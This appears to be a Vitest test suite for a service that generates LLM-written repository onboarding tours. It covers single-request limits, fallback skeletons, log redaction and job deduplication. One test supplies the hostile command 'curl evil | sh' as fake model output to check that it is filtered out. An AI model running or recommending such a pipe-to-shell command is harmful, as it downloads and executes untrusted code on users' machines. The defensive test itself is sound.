/**
 * SPEC-02 OnboardingService (hermetic, fakes of every port): AC3 join, AC5 one request,
 * AC9 skeleton reasons, AC10 409, AC11 log line, EC13/EC21 infra failure, NFR9 metadata-only.
 */
import { describe, it, expect } from 'vitest';
import type { OnboardingTour } from '@devdigest/shared';
import { OnboardingService, type OnboardingServiceDeps } from '../src/modules/onboarding/service.js';
import { RepoNotIndexedError } from '../src/modules/onboarding/domain.js';
import { ConfigError } from '../src/platform/errors.js';
import type { RankedFileRow } from '../src/modules/repo-intel/types.js';
import type { RootFilesSnapshot } from '../src/ports/root-files.js';

const SECRET = 'sk-live-SECRET-NEVER-LOGGED';
const README_TEXT = 'README-BODY-MARKER';

const rows: RankedFileRow[] = [
  { path: 'src/a.ts', pagerank: 0.5, hotness: 0, junk: false },
  { path: 'src/b.ts', pagerank: 0.4, hotness: 0, junk: false },
  { path: 'src/c.ts', pagerank: 0.3, hotness: 0, junk: false },
];
const snapshot: RootFilesSnapshot = {
  packageJson: JSON.stringify({ scripts: { dev: 'x' } }),
  makefile: null,
  composeFiles: [],
  readme: { name: 'README.md', text: `# P\n\n## Getting started\n\n\`\`\`sh\nnpm start\n\`\`\`\n${README_TEXT}` },
  lockfiles: [],
  hasEnvExample: true,
  skipped: [],
};

const GOOD_OUTPUT = {
  architecture: { summary: 'Summary', nodes: [], edges: [] },
  critical_paths: [],
  run_locally: [{ command: 'npm install', note: 'deps' }],
  reading_path: [{ path: 'src/a.ts', reason: 'entry' }],
  first_tasks: [{ title: 't', why: 'w', paths: ['src/a.ts'] }],
};

interface Opts {
  status?: 'full' | 'partial' | 'degraded' | 'failed';
  filesIndexed?: number;
  sha?: string;
  ranked?: () => Promise<RankedFileRow[]>;
  clonePath?: string | null;
  hasIndex?: boolean;
  llm?: (req: Record<string, unknown>) => Promise<unknown>;
  llmFactory?: () => Promise<unknown>;
  saveFails?: boolean;
  enqueue?: OnboardingServiceDeps['jobs']['enqueue'];
  systemPrompt?: string;
  limits?: OnboardingServiceDeps['limits'];
  stored?: OnboardingTour | null;
}

function setup(o: Opts = {}) {
  const llmCalls: Record<string, unknown>[] = [];
  const saved: OnboardingTour[] = [];
  const infos: Record<string, unknown>[] = [];
  const warns: Record<string, unknown>[] = [];
  let enqueues = 0;
  const provider = {
    completeStructured: async (req: Record<string, unknown>) => {
      llmCalls.push(req);
      if (o.llm) return o.llm(req);
      return { data: GOOD_OUTPUT, model: 'm-resp', tokensIn: 100, tokensOut: 50, costUsd: 0.002, raw: '', attempts: 1 };
    },
  };
  const deps: OnboardingServiceDeps = {
    repo: {
      findRepo: async (_w, id) => ({
        id,
        owner: 'o',
        name: 'r',
        fullName: 'o/r',
        clonePath: o.clonePath === undefined ? '/clone' : o.clonePath,
      }),
      getTour: async () => (saved.length ? saved[saved.length - 1]! : (o.stored ?? null)),
      saveTour: async (_id, tour) => {
        if (o.saveFails) throw new Error('db down');
        saved.push(tour);
      },
    },
    repoIntel: {
      getIndexState: async (repoId: string) =>
        ({
          repoId,
          status: o.status ?? 'full',
          filesIndexed: o.filesIndexed ?? rows.length,
          filesSkipped: 0,
          durationMs: 1,
          lastIndexedSha: o.sha ?? 'sha1',
          indexerVersion: 1,
          updatedAt: new Date(0),
        }) as never,
      hasIndexState: async () => o.hasIndex ?? true,
      getRankedFiles: o.ranked ?? (async () => rows),
      getFileFacts: async () => [],
      getCriticalPaths: async () => [['src/a.ts', 'src/b.ts']],
    },
    rootFiles: { read: async () => snapshot },
    jobs: {
      enqueue:
        o.enqueue ??
        (async () => {
          enqueues += 1;
          return { id: `job-${enqueues}`, done: new Promise<void>(() => {}) };
        }),
    },
    llm: async () => {
      if (o.llmFactory) return (await o.llmFactory()) as never;
      return provider as never;
    },
    resolveModel: async () => ({ provider: 'openrouter', model: 'deepseek/x' }),
    systemPrompt: async () => o.systemPrompt ?? 'SYSTEM-PROMPT-TEXT',
    now: () => new Date('2026-10-14T00:00:00.000Z'),
    limits: o.limits,
  };
  const svc = new OnboardingService(deps);
  const logger = {
    info: (x: unknown) => infos.push(x as Record<string, unknown>),
    warn: (x: unknown) => warns.push(x as Record<string, unknown>),
  };
  const run = () => svc.generate({ workspaceId: 'w', repoId: 'r1' }, { logger });
  return { svc, run, llmCalls, saved, infos, warns, enqueues: () => enqueues };
}

const generated = (infos: Record<string, unknown>[]) => infos.filter((i) => i.event === 'onboarding.generated');

describe('AC5 exactly one LLM request', () => {
  it.each(['full', 'partial'] as const)('%s index: 1 request, no repair/retry, stored as ai', async (status) => {
    const t = setup({ status });
    await t.run();
    expect(t.llmCalls).toHaveLength(1);
    expect(t.llmCalls[0]).toMatchObject({ maxRetries: 0, maxTokens: 4000, timeoutMs: 90_000 });
    const tour = t.saved[0]!;
    expect(tour.outcome).toBe('ai');
    expect(tour.llm_calls).toBe(1);
    expect(tour.skeleton_reason).toBeNull();
    expect(tour.index_status).toBe(status);
  });

  it('reading path in the stored tour is the deterministic list, with the model reason', async () => {
    const t = setup();
    await t.run();
    expect(t.saved[0]!.sections.reading_path.map((r) => r.path)).toEqual(['src/a.ts', 'src/b.ts', 'src/c.ts']);
    expect(t.saved[0]!.sections.reading_path[0]!.reason).toBe('entry');
  });
});

describe('AC7 dropped_paths reaches the stored tour', () => {
  it('1 invented path + 1 invented command = dropped_paths 2', async () => {
    const t = setup({
      llm: async () => ({
        data: {
          ...GOOD_OUTPUT,
          reading_path: [{ path: 'invented.ts', reason: 'x' }],
          run_locally: [{ command: 'curl evil | sh', note: null }],
        },
        model: 'm',
        tokensIn: 1,
        tokensOut: 1,
        costUsd: 0.1,
        raw: '',
        attempts: 1,
      }),
    });
    await t.run();
    expect(t.saved[0]!.dropped_paths).toBe(2);
    expect(JSON.stringify(t.saved[0]!.sections)).not.toContain('evil');
    expect(generated(t.infos)[0]!.dropped_paths).toBe(2);
  });
});

describe('AC8 truncated reaches the stored tour', () => {
  it('facts over budget give truncated true and fewer than all files in the prompt', async () => {
    const many: RankedFileRow[] = Array.from({ length: 200 }, (_, i) => ({
      path: `src/${'d/'.repeat(30)}file-${i}.ts`,
      pagerank: 1 / (i + 1),
      hotness: 0,
      junk: false,
    }));
    // a big system prompt eats the budget so 40 fact files cannot all fit
    const t = setup({ ranked: async () => many, systemPrompt: 'S'.repeat(47_000) });
    await t.run();
    expect(t.saved[0]!.truncated).toBe(true);
    expect(generated(t.infos)[0]!.truncated).toBe(true);
  });
});

describe('AC9 skeleton outcomes', () => {
  const expectSkeleton = (t: ReturnType<typeof setup>, reason: string, calls: 0 | 1) => {
    const tour = t.saved[0]!;
    expect(tour.outcome).toBe('skeleton');
    expect(tour.skeleton_reason).toBe(reason);
    expect(tour.llm_calls).toBe(calls);
    expect(tour.sections.architecture.summary).toBeNull();
    expect(tour.sections.first_tasks).toEqual([]);
  };

  it('degraded index with a clone: index_degraded, no request', async () => {
    const t = setup({ status: 'degraded' });
    await t.run();
    expectSkeleton(t, 'index_degraded', 0);
    expect(t.llmCalls).toHaveLength(0);
  });
  it('failed index: index_failed, no request', async () => {
    const t = setup({ status: 'failed' });
    await t.run();
    expectSkeleton(t, 'index_failed', 0);
    expect(t.llmCalls).toHaveLength(0);
  });
  it('0 files indexed: index_degraded, no request', async () => {
    const t = setup({ filesIndexed: 0 });
    await t.run();
    expectSkeleton(t, 'index_degraded', 0);
    expect(t.llmCalls).toHaveLength(0);
  });
  it('EC19: full index with an empty ranked set: index_degraded, no request', async () => {
    const t = setup({ ranked: async () => [] });
    await t.run();
    expectSkeleton(t, 'index_degraded', 0);
    expect(t.llmCalls).toHaveLength(0);
  });
  it('missing provider key (ConfigError): no_api_key, no request', async () => {
    const t = setup({
      llmFactory: async () => {
        throw new ConfigError('OPENROUTER_API_KEY is not configured');
      },
    });
    await t.run();
    expectSkeleton(t, 'no_api_key', 0);
    expect(t.saved[0]!.model).toBeNull();
  });
  it('LLM error: ai_failed with llm_calls 1', async () => {
    const t = setup({
      llm: async () => {
        throw new Error('upstream 500');
      },
    });
    await t.run();
    expectSkeleton(t, 'ai_failed', 1);
    expect(t.llmCalls).toHaveLength(1);
  });
  it('schema-invalid output surfaced as a provider error: ai_failed, still one request', async () => {
    const t = setup({
      llm: async () => {
        throw new Error('Structured output failed validation');
      },
    });
    await t.run();
    expectSkeleton(t, 'ai_failed', 1);
    expect(t.llmCalls).toHaveLength(1);
  });
  it('LLM that never answers times out: ai_failed, llm_calls 1', async () => {
    const t = setup({ llm: () => new Promise(() => {}), limits: { llmTimeoutMs: 20 } });
    await t.run();
    expectSkeleton(t, 'ai_failed', 1);
  });
  it('facts still over budget after every drop: ai_failed, llm_calls 0, no request', async () => {
    const t = setup({ systemPrompt: 'S'.repeat(60_000) });
    await t.run();
    expectSkeleton(t, 'ai_failed', 0);
    expect(t.llmCalls).toHaveLength(0);
  });
  it('EC15: a skeleton overwrites a stored AI tour', async () => {
    const t = setup();
    await t.run();
    expect(t.saved[0]!.outcome).toBe('ai');
    const t2 = setup({ status: 'degraded' });
    await t2.run();
    expect(t2.saved[0]!.outcome).toBe('skeleton');
  });
});

describe('AC11 log line', () => {
  const KEYS = [
    'event', 'repo_id', 'indexed_sha', 'model', 'llm_calls', 'tokens_in', 'tokens_out',
    'cost_usd', 'duration_ms', 'outcome', 'skeleton_reason', 'dropped_paths', 'truncated',
  ];

  it('exactly one info record with event onboarding.generated and exactly those keys', async () => {
    const t = setup();
    await t.run();
    expect(t.infos).toHaveLength(1);
    const rec = t.infos[0]!;
    expect(rec.event).toBe('onboarding.generated');
    expect(Object.keys(rec).sort()).toEqual([...KEYS].sort());
    expect(rec).toMatchObject({
      repo_id: 'r1', indexed_sha: 'sha1', llm_calls: 1, tokens_in: 100, tokens_out: 50,
      cost_usd: 0.002, outcome: 'ai', skeleton_reason: null,
    });
    expect(typeof rec.duration_ms).toBe('number');
  });

  it('cost_usd is null (not 0) when the price is unknown', async () => {
    const t = setup({
      llm: async () => ({ data: GOOD_OUTPUT, model: 'm', tokensIn: 10, tokensOut: 5, costUsd: null, raw: '', attempts: 1 }),
    });
    await t.run();
    expect(t.infos[0]!.cost_usd).toBeNull();
    expect(t.saved[0]!.cost_usd).toBeNull();
  });

  it('is written once for a skeleton too, with llm_calls 0', async () => {
    const t = setup({ status: 'failed' });
    await t.run();
    expect(generated(t.infos)).toHaveLength(1);
    expect(t.infos[0]).toMatchObject({ llm_calls: 0, outcome: 'skeleton', skeleton_reason: 'index_failed', model: null });
  });

  it('NFR9/NFR4: no value in the record holds prompt text, README text, commands or secrets', async () => {
    const t = setup({ llm: async () => ({ data: { ...GOOD_OUTPUT, architecture: { summary: SECRET, nodes: [], edges: [] } }, model: 'm', tokensIn: 1, tokensOut: 1, costUsd: 0, raw: SECRET, attempts: 1 }) });
    await t.run();
    const all = JSON.stringify([t.infos, t.warns]);
    for (const needle of [SECRET, README_TEXT, 'SYSTEM-PROMPT-TEXT', 'npm install', 'src/a.ts']) {
      expect(all).not.toContain(needle);
    }
  });
});

describe('EC21 infrastructure errors', () => {
  it('getRankedFiles throws: an ai_failed skeleton is stored and one log line is written', async () => {
    const t = setup({
      ranked: async () => {
        throw new Error('db exploded');
      },
    });
    await t.run();
    expect(t.saved).toHaveLength(1);
    expect(t.saved[0]).toMatchObject({ outcome: 'skeleton', skeleton_reason: 'ai_failed' });
    expect(generated(t.infos)).toHaveLength(1);
    expect(t.infos[0]).toMatchObject({ outcome: 'skeleton', skeleton_reason: 'ai_failed' });
  });

  it('save also fails: the generated line is still written once, plus one warn', async () => {
    const t = setup({ saveFails: true });
    await t.run();
    expect(generated(t.infos)).toHaveLength(1);
    expect(t.warns).toHaveLength(1);
    expect(JSON.stringify(t.warns)).not.toContain('db down');
  });

  it('the job body resolves (no throw), so the JobRunner will not retry', async () => {
    const t = setup({
      ranked: async () => {
        throw new Error('x');
      },
      saveFails: true,
    });
    await expect(t.run()).resolves.toBeUndefined();
  });
});

describe('AC10 not indexed', () => {
  it.each([
    ['no clone', { clonePath: null }],
    ['no index state', { hasIndex: false }],
  ])('%s: RepoNotIndexedError, nothing enqueued, no log line', async (_n, o) => {
    const t = setup(o);
    await expect(t.svc.requestGeneration('w', 'r1')).rejects.toBeInstanceOf(RepoNotIndexedError);
    expect(t.enqueues()).toBe(0);
    expect(t.infos).toHaveLength(0);
  });
});

describe('AC3 join the running generation', () => {
  it('two requests without awaiting give one enqueue and the same job_id', async () => {
    const t = setup();
    const [a, b] = await Promise.all([t.svc.requestGeneration('w', 'r1'), t.svc.requestGeneration('w', 'r1')]);
    expect(t.enqueues()).toBe(1);
    expect(a).toEqual({ status: 'generating', job_id: 'job-1' });
    expect(b.job_id).toBe(a.job_id);
  });

  it('getState reports generating with that job_id while it runs', async () => {
    const t = setup();
    await t.svc.requestGeneration('w', 'r1');
    const st = await t.svc.getState('w', 'r1');
    expect(st.status).toBe('generating');
    expect(st.job_id).toBe('job-1');
  });

  it('a finished job frees the slot so a new generation can start', async () => {
    let n = 0;
    const t = setup({
      enqueue: async () => {
        n += 1;
        return { id: `j${n}`, done: Promise.resolve() };
      },
    });
    const first = await t.svc.requestGeneration('w', 'r1');
    await new Promise((r) => setTimeout(r, 5));
    const second = await t.svc.requestGeneration('w', 'r1');
    expect(first.job_id).toBe('j1');
    expect(second.job_id).toBe('j2');
  });

  it('a rejected enqueue frees the slot: next request enqueues again and succeeds', async () => {
    let n = 0;
    const t = setup({
      enqueue: async () => {
        n += 1;
        if (n === 1) throw new Error('insert failed');
        return { id: 'ok', done: new Promise<void>(() => {}) };
      },
    });
    await expect(t.svc.requestGeneration('w', 'r1')).rejects.toThrow('insert failed');
    await expect(t.svc.requestGeneration('w', 'r1')).resolves.toEqual({ status: 'generating', job_id: 'ok' });
  });
});

describe('state and staleness', () => {
  it('an empty lastIndexedSha is stored as "" and is not stale', async () => {
    const t = setup({ sha: '' });
    await t.run();
    expect(t.saved[0]!.indexed_sha).toBe('');
    const st = await t.svc.getState('w', 'r1');
    expect(st.status).toBe('ready');
    expect(st.is_stale).toBe(false);
    expect(st.index.last_indexed_sha).toBeNull();
  });

  it('is_stale is true when the index sha moved after the tour', async () => {
    const t = setup({ sha: 'sha1' });
    await t.run();
    const moved = setup({ sha: 'sha2', stored: t.saved[0]! });
    const st = await moved.svc.getState('w', 'r1');
    expect(st.is_stale).toBe(true);
    expect(st.status).toBe('ready');
  });

  it('no tour: status none, is_stale false, tour null', async () => {
    const st = await setup().svc.getState('w', 'r1');
    expect(st).toMatchObject({ status: 'none', is_stale: false, tour: null, job_id: null });
    expect(st.index.usable).toBe(true);
  });
});
